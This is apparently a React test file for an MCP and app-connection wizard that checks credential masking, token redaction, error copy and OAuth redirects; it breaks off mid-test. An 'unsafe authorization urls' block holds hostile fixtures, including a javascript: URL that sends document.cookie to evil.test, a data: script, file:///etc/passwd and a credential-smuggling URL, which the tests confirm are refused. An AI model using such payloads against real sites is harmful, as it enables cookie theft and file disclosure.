  it("choosing Yes reveals one masked key field without extra reassurance copy", async () => {
    await render();
    await gotoLinkFrame(container, "https://www.example.com/actions");

    // No key field while No is selected.
    expect(
      Array.from(container.querySelectorAll<HTMLInputElement>("input")).some(
        (i) => i.type === "password",
      ),
    ).toBe(false);

    await act(async () => {
      buttonByText("Yes")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const passwordInputs = Array.from(
      container.querySelectorAll<HTMLInputElement>("input"),
    ).filter((i) => i.type === "password");
    expect(passwordInputs).toHaveLength(1);
    expect(container.textContent).not.toContain("Stored securely.");

    await act(async () => setInputValue(passwordInputs[0], "secret-key"));
    await flushReact();

    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input.credentialValues).toEqual({ "credentials.authorization": "secret-key" });
  });

  it("a Zapier MCP URL stays in the URL flow and includes its token in the submitted link", async () => {
    await render();

    const linkInput = Array.from(
      container.querySelectorAll<HTMLInputElement>("input"),
    ).find((i) => i.getAttribute("placeholder")?.startsWith("https://"));
    const zapierUrl = "https://mcp.zapier.com/api/v1/connect?token=secret-token";
    await act(async () => setInputValue(linkInput!, zapierUrl));
    await flushReact();

    expect(container.textContent).toContain("This looks like Zapier.");
    expect(linkInput?.type).toBe("password");
    expect(linkInput?.autocomplete).toBe("off");

    await act(async () => {
      buttonByText("Continue")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(container.textContent).toContain("Which agents can use this connection?");
    await passAccessStep();

    expect(container.textContent).toContain("Connect your own MCP server");
    expect(container.textContent).not.toContain(zapierUrl);
    expect(container.textContent).toContain("token=REDACTED");
    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();
    expect(container.querySelector('input[type="password"]')).toBeNull();

    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(connectAppMock.mock.calls[0]?.[1]).toMatchObject({
      link: zapierUrl,
      name: "Zapier for the company",
      galleryKey: "zapier",
      connectionMethodKey: "generated-url",
    });
    expect(connectAppMock.mock.calls[0]?.[1].credentialValues).toBeUndefined();
  });

  it("gives Zapier the shared credential and agent access opener", async () => {
    mockSearch.value = "source=zapier";
    listGalleryMock.mockResolvedValueOnce({
      apps: [
        { ...ZAPIER, branding: { ...ZAPIER.branding, logoUrl: "https://example.com/zapier.png" } },
      ],
    });
    connectAppMock.mockResolvedValueOnce({
      connectionId: "conn-1",
      application: { id: "app-1", name: "Zapier" },
      actions: {
        readOnly: [
          {
            catalogEntryId: "action-1",
            toolName: "find_record",
            title: "Find record",
            description: "Find a record.",
            riskLevel: "read",
          },
        ],
        canMakeChanges: [
          {
            catalogEntryId: "action-2",
            toolName: "create_record",
            title: "Create record",
            description: "Create a record.",
            riskLevel: "write",
          },
        ],
      },
      catalog: [],
      suggestedDefaults: { askFirstRiskLevels: [] },
    });
    await render();

    expect(container.textContent).toContain("Step 1 of 2");
    expect(container.textContent).toContain("Connect Zapier");
    expect(container.textContent).toContain("Which humans can use this credential?");
    expect(container.textContent).toContain("Which agents can use this connection?");
    expect(container.querySelector('img[src="https://example.com/zapier.png"]')).toBeTruthy();
    expect(container.textContent).not.toContain("Pick the app you want your agents to use.");
    expect(container.querySelector('input[placeholder^="https://mcp.zapier.com"]')).toBeNull();

    await act(async () => {
      radioContaining("Just me")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();

    expect(container.textContent).toContain("Step 2 of 2");
    expect(container.textContent).toContain("Add MCP URL");

    const linkInput = container.querySelector<HTMLInputElement>(
      'input[placeholder^="https://mcp.zapier.com"]',
    );
    expect(linkInput?.type).toBe("password");
    expect(linkInput?.autocomplete).toBe("off");
    const zapierUrl = "https://mcp.zapier.com/api/v1/connect?token=secret-token";
    await act(async () => setInputValue(linkInput!, zapierUrl));
    await flushReact();

    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(connectAppMock.mock.calls[0]?.[1]).toMatchObject({
      link: zapierUrl,
      name: "Zapier",
      galleryKey: "zapier",
      connectionMethodKey: "generated-url",
      grantKind: "user",
    });

    expect(finishAppMock).toHaveBeenCalledWith("company-1", "conn-1", {
      enabledCatalogEntryIds: ["action-1", "action-2"],
      askFirstCatalogEntryIds: [],
      access: "all_agents",
    });
    expect(putConnectionInstallsMock).toHaveBeenCalledWith("conn-1", [
      { targetType: "company", targetId: "company-1" },
    ]);
  });

  it("keeps alternate setup methods out of the connection wizard", async () => {
    await render();

    expect(container.textContent).not.toContain("More ways to connect");
    expect(container.textContent).not.toContain("Run your own");
    expect(container.textContent).not.toContain("Paste a config");
  });

  // PAP-11091: discoverability copy for remote MCP URLs — the link field
  // advertises that any remote tool URL (incl. a local MCP server) works. Per
  // the UX re-review, the localhost example lives in the body copy (legible at
  // every viewport) rather than the placeholder, which truncated on mobile.
  it("advertises that remote/local MCP URLs work under 'Connect with a link'", async () => {
    await render();

    expect(container.textContent).toContain(
      "Any remote tool URL works here — including a local MCP server like",
    );
    expect(container.textContent).toContain("http://127.0.0.1:8848/mcp");
    const linkInput = Array.from(container.querySelectorAll<HTMLInputElement>("input")).find((i) =>
      i.getAttribute("placeholder")?.startsWith("https://example.com/actions"),
    );
    // Placeholder stays a single, short example so it never truncates.
    expect(linkInput?.getAttribute("placeholder")).toBe("https://example.com/actions");
  });

  // Reconnect from the app page: ?link/?name/?applicationId prefill skips the
  // gallery and re-attaches the connection to the existing application.
  it("prefills the link frame from search params and passes applicationId to connect", async () => {
    mockSearch.value =
      "link=https%3A%2F%2Fwww.example.com%2Factions&name=Bla&applicationId=app-77";
    await render();

    expect(container.textContent).toContain("Which humans can use this credential?");
    await passAccessStep();

    expect(container.textContent).toContain("Connect your own MCP server");
    expect(container.textContent).toContain("https://www.example.com/actions");
    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();

    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      link: "https://www.example.com/actions",
      name: "Bla for the company",
      applicationId: "app-77",
    });
  });

  it("shows the Google Sheets robot email and keeps empty sheet links from continuing", async () => {
    listGalleryMock.mockResolvedValueOnce({
      apps: [
        { ...GOOGLE_SHEETS, availability: { available: true, robotEmail: "robot@paperclip.iam.gserviceaccount.com" } },
      ],
    });
    await render();

    await act(async () => {
      buttonContaining("Google Sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();
    await act(async () => {
      buttonContaining("Share selected sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("Share each sheet with this email");
    expect(container.textContent).toContain("robot@paperclip.iam.gserviceaccount.com");
    expect(container.textContent).toContain(
      "In Google Sheets, click Share and add this email as an Editor. Then paste the sheet links below.",
    );
    expect(buttonByText("Connect")?.disabled).toBe(true);
  });

  it("shows inline validation for invalid Google Sheets links", async () => {
    listGalleryMock.mockResolvedValueOnce({
      apps: [
        { ...GOOGLE_SHEETS, availability: { available: true, robotEmail: "robot@paperclip.iam.gserviceaccount.com" } },
      ],
    });
    await render();

    await act(async () => {
      buttonContaining("Google Sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();
    await act(async () => {
      buttonContaining("Share selected sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    const textarea = container.querySelector<HTMLTextAreaElement>("textarea");
    await act(async () => setTextareaValue(textarea!, "https://example.com/not-a-sheet"));
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.textContent).toContain("That doesn't look like a Google Sheets link.");
    expect(connectAppMock).not.toHaveBeenCalled();
  });

  it("gallery setup names the connection automatically", async () => {
    await render();

    await act(async () => {
      buttonContaining("GitHub")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();

    expect(container.textContent).toContain("Connect GitHub");
    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();
    expect(mockNavigate).toHaveBeenCalledWith("/apps/connect?source=github&stage=setup");
  });

  it("keeps the originating connection intent in wizard URLs", async () => {
    const interactionId = "11111111-1111-4111-8111-111111111111";
    mockSearch.value = `intent=${interactionId}`;
    await render();

    await act(async () => {
      buttonContaining("GitHub")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(mockNavigate).toHaveBeenCalledWith(
      `/apps/connect?source=github&intent=${interactionId}`,
    );

    await passAccessStep();
    expect(mockNavigate).toHaveBeenCalledWith(
      `/apps/connect?source=github&stage=setup&intent=${interactionId}`,
    );
  });

  it("steps back from the key step to Access, and from Access to Connectors", async () => {
    mockSearch.value = "";
    mockParams.appKey = "github";
    await render();
    await passAccessStep();
    expect(container.textContent).toContain("Connect GitHub");

    // Back from the credential goes to Access, not all the way out: the
    // selections made there have to survive (PAP-17835).
    await act(async () => {
      buttonByText("Back")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(container.textContent).toContain("Which GitHub identity should this use?");

    await act(async () => {
      buttonByText("Back")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(mockNavigate).toHaveBeenCalledWith("/apps");
    expect(mockNavigate).not.toHaveBeenCalledWith("/apps/connect?byo=1");
  });

  it("leaving the default name connects with the app name", async () => {
    await render();

    await act(async () => {
      buttonContaining("GitHub")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();

    const keyField = container.querySelector<HTMLInputElement>("input[type=password]");
    await act(async () => setInputValue(keyField!, "secret-key"));
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(mockNavigate).toHaveBeenCalledWith("/apps/connect?source=github");
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({ galleryKey: "github", name: "GitHub for the company" });
  });

  it("continues an exact credential-based draft instead of creating a replacement", async () => {
    const connectionId = "33333333-3333-4333-8333-333333333333";
    mockSearch.value = `source=github&resume=${connectionId}`;
    listGalleryMock.mockResolvedValueOnce({ apps: [GITHUB] });
    listApplicationsMock.mockResolvedValueOnce({
      applications: [{ id: "app-github", status: "active", metadata: { sourceTemplateKey: "github" } }],
    });
    listConnectionsMock.mockResolvedValueOnce({
      connections: [{
        id: connectionId,
        applicationId: "app-github",
        name: "Engineering GitHub for the company",
        authKind: "api_key",
        credentialPolicy: "shared",
        status: "draft",
        config: { sourceTemplateKey: "github", connectionMethodKey: "mcp-key" },
        transportConfig: {},
      }],
    });

    await render();
    await passAccessStep();
    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();
    const keyField = container.querySelector<HTMLInputElement>("input[type=password]");
    await act(async () => setInputValue(keyField!, "replacement-key"));
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    expect(connectAppMock.mock.calls[0]?.[1]).toMatchObject({
      galleryKey: "github",
      connectionMethodKey: "mcp-key",
      resumeConnectionId: connectionId,
      name: "Engineering GitHub for the company",
      credentialValues: { "credentials.authorization": "replacement-key" },
    });
  });

  it("uses the gallery app name automatically", async () => {
    await render();

    await act(async () => {
      buttonContaining("GitHub")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();

    const keyField = container.querySelector<HTMLInputElement>("input[type=password]");
    await act(async () => setInputValue(keyField!, "secret-key"));
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      galleryKey: "github",
      name: "GitHub for the company",
    });
  });

  it("uses the Google Sheets app name automatically", async () => {
    listGalleryMock.mockResolvedValueOnce({
      apps: [
        { ...GOOGLE_SHEETS, availability: { available: true, robotEmail: "robot@paperclip.iam.gserviceaccount.com" } },
      ],
    });
    await render();

    await act(async () => {
      buttonContaining("Google Sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();
    await act(async () => {
      buttonContaining("Share selected sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(container.querySelector('input[placeholder="My app"]')).toBeNull();
    const textarea = container.querySelector<HTMLTextAreaElement>("textarea");
    await act(async () =>
      setTextareaValue(textarea!, "https://docs.google.com/spreadsheets/d/sheet_123/edit"),
    );
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      galleryKey: "google-sheets",
      name: "Google Sheets for the company",
      configValues: { allowedSpreadsheetIds: ["sheet_123"] },
    });
  });

  it("passes parsed Google Sheets IDs as connection config values", async () => {
    listGalleryMock.mockResolvedValueOnce({
      apps: [
        { ...GOOGLE_SHEETS, availability: { available: true, robotEmail: "robot@paperclip.iam.gserviceaccount.com" } },
      ],
    });
    await render();

    await act(async () => {
      buttonContaining("Google Sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await passAccessStep();
    await act(async () => {
      buttonContaining("Share selected sheets")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    const textarea = container.querySelector<HTMLTextAreaElement>("textarea");
    await act(async () =>
      setTextareaValue(
        textarea!,
        "https://docs.google.com/spreadsheets/d/sheet_123/edit\nhttps://docs.google.com/spreadsheets/d/sheet_456",
      )
    );
    await flushReact();
    await act(async () => {
      buttonByText("Connect")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      galleryKey: "google-sheets",
      configValues: { allowedSpreadsheetIds: ["sheet_123", "sheet_456"] },
    });
  });
});

/**
 * PAP-17087 — the BYO URL card is now the guided universal flow. What matters is
 * that the simple path stayed simple, that each failure mode names the thing the
 * operator has to change, and that a pasted endpoint that needs sign-in actually
 * gets there instead of a "coming soon" toast.
 */
describe("AppsConnect — guided generic MCP flow (PAP-17087)", () => {
  let container: HTMLDivElement;
  let mountedRoot: Root | null;

  beforeEach(() => {
    mockSearch.value = "";
    mockParams.appKey = undefined;
    container = document.createElement("div");
    document.body.appendChild(container);
    mountedRoot = null;
    listGalleryMock.mockResolvedValue({ apps: [ZAPIER] });
    listApplicationsMock.mockResolvedValue({ applications: [] });
    listConnectionsMock.mockResolvedValue({ connections: [] });
    listAgentsMock.mockResolvedValue([]);
    finishAppMock.mockResolvedValue({});
    putConnectionInstallsMock.mockResolvedValue({ connectionId: "conn-1", installs: [] });
    startOAuthMock.mockResolvedValue({
      connectionId: "conn-1",
      provider: "mcp_example_test",
      authorizationUrl: "https://auth.example.test/authorize?state=abc",
      expiresAt: "2099-01-01T00:00:00.000Z",
    });
    connectAppMock.mockResolvedValue({
      connectionId: "conn-1",
      application: { id: "app-1", name: "mcp.example.test" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
    });
  });

  afterEach(async () => {
    if (mountedRoot) {
      await act(async () => mountedRoot?.unmount());
    }
    document.body.removeChild(container);
    document.body.innerHTML = "";
    vi.restoreAllMocks();
    vi.clearAllMocks();
  });

  async function render() {
    const root = createRoot(container);
    mountedRoot = root;
    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <AppsConnect />
        </QueryClientProvider>,
      );
    });
    await flushReact();
    await flushReact();
    return root;
  }

  async function openAdvanced() {
    await act(async () => {
      buttonContaining("Advanced authentication")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
  }

  // Production branches on `error instanceof ApiError`, so the double has to be a
  // real one — a look-alike would silently fall through to the generic message and
  // make these tests pass for the wrong reason.
  function apiError(status: number, code: string, message: string) {
    return new ApiError(message, status, { error: message, details: { code } });
  }

  it("defaults the hidden connection name from host, port, and path", async () => {
    await render();
    await gotoLinkFrame(container, "http://127.0.0.1:47399/mcp");

    expect(container.querySelector("#generic-mcp-name")).toBeNull();
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    expect(connectAppMock.mock.calls[0]?.[1]).toMatchObject({
      name: "127.0.0.1:47399/mcp for the company",
    });
  });

  it("keeps the endpoint host visible while skipping action review", async () => {
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");

    expect(container.textContent).toContain("Unverified server");
    expect(container.textContent).toContain("mcp.example.test");

    connectAppMock.mockResolvedValue({
      connectionId: "conn-1",
      application: { id: "app-1", name: "mcp.example.test" },
      actions: {
        readOnly: [{
          catalogEntryId: "cat-read",
          toolName: "list_things",
          title: "List things",
          description: null,
          riskLevel: "read",
          isReadOnly: true,
          isWrite: false,
          isDestructive: false,
          status: "active",
        }, {
          catalogEntryId: "cat-search",
          toolName: "search_things",
          title: "Search things",
          description: null,
          riskLevel: "read",
          isReadOnly: true,
          isWrite: false,
          isDestructive: false,
          status: "active",
        }],
        canMakeChanges: [{
          catalogEntryId: "cat-delete",
          toolName: "qa_delete_widget",
          title: null,
          description: null,
          riskLevel: "destructive",
          isReadOnly: false,
          isWrite: true,
          isDestructive: true,
          status: "active",
        }],
      },
      catalog: [],
      suggestedDefaults: { askFirstRiskLevels: [] },
    });
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    // The completion summary states identity and reach once each, as three
    // lines rather than badges, and still never lists the actions.
    expect(container.textContent).toContain("mcp.example.test is ready.");
    expect(container.textContent).toContain("Organization identity");
    expect(container.textContent).toContain("Any agent");
    expect(container.textContent).toContain("3 actions on");
    expect(container.textContent).not.toContain("List things");
    expect(container.querySelectorAll('[role="switch"]')).toHaveLength(0);
  });

  it("offers a curated setup as a convenience without leaving the generic flow", async () => {
    await render();
    await gotoLinkFrame(container, "https://mcp.zapier.com/api/v1/connect?token=t");

    // Both routes are present: the branded shortcut and the generic form itself.
    expect(container.textContent).toContain("Paperclip has a guided setup for Zapier.");
    expect(container.textContent).toContain("Connect your own MCP server");
    expect(buttonByText("Check link")).toBeTruthy();
  });

  it("explains a private-network address instead of blaming the key", async () => {
    connectAppMock.mockRejectedValue(
      apiError(400, "remote_http_private_endpoint", "Remote MCP connection URL cannot target private or reserved network addresses"),
    );
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("That address is inside a private network");
    // Still on the setup screen with the address in hand, not bounced back.
    expect(buttonByText("Check link")).toBeTruthy();
  });

  it("explains an unreachable host", async () => {
    connectAppMock.mockRejectedValue(apiError(400, "remote_http_dns_failed", "hostname could not be resolved"));
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("We couldn't find that host");
  });

  it("uses deployment guidance without rendering the server env-var message", async () => {
    connectAppMock.mockRejectedValue(apiError(
      422,
      "oauth_redirect_origin_unsupported",
      "OAuth connections require PAPERCLIP_PUBLIC_URL or an auth public base URL",
    ));
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("This Paperclip needs a public HTTPS address first");
    expect(container.textContent).not.toContain("PAPERCLIP_PUBLIC_URL");
  });

  it("does not ask the operator to resolve an internal name conflict", async () => {
    connectAppMock.mockRejectedValue(apiError(
      409,
      "tool_access_name_conflict",
      "A tool access record with that name already exists",
    ));
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("Paperclip couldn’t name this connection");
    expect(container.textContent).not.toContain("Choose a different name");
    expect(container.querySelector("#generic-mcp-name")).toBeNull();
  });

  it("opens advanced authentication when the server wants a credential we can't discover", async () => {
    connectAppMock.mockRejectedValue(apiError(502, "oauth_challenge", "This app needs you to sign in."));
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("This server wants a credential");
    // The advanced section is now open, so the fields to fix it are on screen.
    expect(container.textContent).toContain("Custom headers");
    expect(container.textContent).not.toContain("coming soon");
  });

  it("sends the operator to sign-in when the endpoint needs browser authorization", async () => {
    connectAppMock.mockResolvedValue({
      connectionId: "conn-1",
      application: { id: "app-1", name: "mcp.example.test" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: "https://auth.example.test/authorize?state=abc" },
    });
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(navigateTopLevelMock).toHaveBeenCalledWith("https://auth.example.test/authorize?state=abc");
    // Residual risk of a real-but-hostile authorization page: name the host the
    // operator is being handed to (PAP-17099).
    expect(container.textContent).toContain("auth.example.test");
  });

  it("exchanges a managed connect response in the tenant without opening Cloud confirmation", async () => {
    const session = "managed_background_session_1234";
    const request = vi.spyOn(globalThis, "fetch").mockImplementation(async (input) =>
      input === "/cloud/connections/handoff"
        ? Response.json({ authorizationUrl: "https://provider.example.test/authorize?state=managed" })
        : new Response(null, { status: 404 }));
    connectAppMock.mockResolvedValue({
      connectionId: "conn-1",
      application: { id: "app-1", name: "mcp.example.test" },
      connection: { id: "conn-1", credentialPolicy: "shared", status: "draft" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: {
        kind: "oauth",
        startUrl: "https://my.paperclip.app/connections/confirm?session=legacy",
        handoff: { kind: "paperclip_cloud", session },
      },
    });
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();
    await flushReact();

    expect(request).toHaveBeenCalledWith("/cloud/connections/handoff", expect.objectContaining({
      method: "POST",
      body: JSON.stringify({ session }),
    }));
    await vi.waitFor(() => {
      expect(navigateTopLevelMock).toHaveBeenCalledWith(
        "https://provider.example.test/authorize?state=managed",
      );
    });
    expect(navigateTopLevelMock).not.toHaveBeenCalledWith(expect.stringContaining("/connections/confirm"));
  });

  /**
   * PAP-17099 — a generic MCP server picks its own authorization endpoint, and
   * `window.location.assign` is where an unsafe scheme would actually execute.
   * The board refuses independently of the API response.
   */
  describe("unsafe authorization urls", () => {
    const UNSAFE = [
      ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
      ["data:", "data:text/html,<script>alert(document.domain)</script>"],
      ["file:", "file:///etc/passwd"],
      ["plaintext http", "http://evil.test/authorize"],
      ["credentials", "https://auth.example.test@evil.test/authorize"],
    ] as const;

    it.each(UNSAFE)("never opens a %s start url from connect", async (_label, startUrl) => {
      connectAppMock.mockResolvedValue({
        connectionId: "conn-1",
        application: { id: "app-1", name: "mcp.example.test" },
        connection: { id: "conn-1", credentialPolicy: "shared", status: "draft" },
        actions: { readOnly: [], canMakeChanges: [] },
        catalog: [],
        suggestedDefaults: {},
        auth: { kind: "oauth", startUrl },
      });
      await render();
      await gotoLinkFrame(container, "https://mcp.example.test/mcp");
      await act(async () => {
        buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
      });
      await flushReact();
      await flushReact();

      expect(navigateTopLevelMock).not.toHaveBeenCalled();
      expect(container.textContent).toContain("couldn’t connect");
      // The refusal is explained without echoing the hostile address on screen.
      expect(container.textContent).not.toContain(startUrl);
      expect(container.textContent).toMatch(/sign-in address/);
    });

    it.each(UNSAFE)("never opens a %s authorization url from start sign-in", async (_label, authorizationUrl) => {
      connectAppMock.mockResolvedValue({
        connectionId: "conn-1",
        application: { id: "app-1", name: "mcp.example.test" },
        connection: { id: "conn-1", credentialPolicy: "shared", status: "draft" },
        actions: { readOnly: [], canMakeChanges: [] },
        catalog: [],
        suggestedDefaults: {},
        auth: { kind: "oauth", startUrl: null },
      });
      startOAuthMock.mockResolvedValue({
        connectionId: "conn-1",
        provider: "mcp_example_test",
        authorizationUrl,
        expiresAt: "2099-01-01T00:00:00.000Z",
      });
      await render();
      await gotoLinkFrame(container, "https://mcp.example.test/mcp");
      await act(async () => {
        buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
      });
      await flushReact();
      await flushReact();

      expect(startOAuthMock).toHaveBeenCalledWith("conn-1", {
        asCurrentUser: false,
      });
      expect(navigateTopLevelMock).not.toHaveBeenCalled();
      expect(container.textContent).toContain("couldn’t connect");
      expect(container.textContent).not.toContain(authorizationUrl);
      // Retry is still offered rather than a dead end.
      expect(buttonByText("Try again")).toBeTruthy();
    });
  });

  it("asks for a preregistered client rather than losing the draft", async () => {
    connectAppMock.mockResolvedValue({
      connectionId: "conn-1",
      application: { id: "app-1", name: "mcp.example.test" },
      actions: { readOnly: [], canMakeChanges: [] },
      catalog: [],
      suggestedDefaults: {},
      auth: { kind: "oauth", startUrl: null, manualClientRequired: true },
    });
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();
    await flushReact();

    expect(container.textContent).toContain("This server needs sign-in details you create yourself");
    expect(container.textContent).toContain("Client ID");
    expect(container.textContent).toContain("Client secret");
    // No redirect happened: there is nothing to redirect to yet.
    expect(navigateTopLevelMock).not.toHaveBeenCalled();
  });

  it("submits custom headers as secret-backed credential values", async () => {
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await openAdvanced();
    await act(async () => {
      buttonByText("Custom headers")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const nameInput = Array.from(container.querySelectorAll<HTMLInputElement>("input"))
      .find((input) => input.getAttribute("aria-label") === "Header name")!;
    await act(async () => setInputValue(nameInput, "X-Api-Key"));
    await flushReact();
    const valueInput = Array.from(container.querySelectorAll<HTMLInputElement>("input"))
      .find((input) => input.type === "password")!;
    await act(async () => setInputValue(valueInput, "phx_secret"));
    await flushReact();

    await act(async () => {
      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(connectAppMock).toHaveBeenCalledTimes(1);
    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      link: "https://mcp.example.test/mcp",
      authMode: "custom_headers",
      credentialValues: { "headers.X-Api-Key": "phx_secret" },
    });
  });

  it("blocks a header Paperclip refuses to send before making a request", async () => {
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await openAdvanced();
    await act(async () => {
      buttonByText("Custom headers")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const nameInput = Array.from(container.querySelectorAll<HTMLInputElement>("input"))
      .find((input) => input.getAttribute("aria-label") === "Header name")!;
    await act(async () => setInputValue(nameInput, "Host"));
    await flushReact();
    const valueInput = Array.from(container.querySelectorAll<HTMLInputElement>("input"))
      .find((input) => input.type === "password")!;
    await act(async () => setInputValue(valueInput, "evil.example"));
    await flushReact();

    expect(container.textContent).toContain('Paperclip manages the "Host" header');
    expect(buttonByText("Check link")?.disabled).toBe(true);
    expect(connectAppMock).not.toHaveBeenCalled();
  });

  it("sends preregistered client credentials when the operator supplies them", async () => {
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await openAdvanced();
    await act(async () => {
      buttonByText("Browser sign-in")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const clientIdInput = container.querySelector<HTMLInputElement>("#generic-mcp-client-id")!;
    await act(async () => setInputValue(clientIdInput, "operator-client"));
    await flushReact();
    const clientSecretInput = container.querySelector<HTMLInputElement>("#generic-mcp-client-secret")!;
    await act(async () => setInputValue(clientSecretInput, "operator-secret"));
    await flushReact();

    await act(async () => {
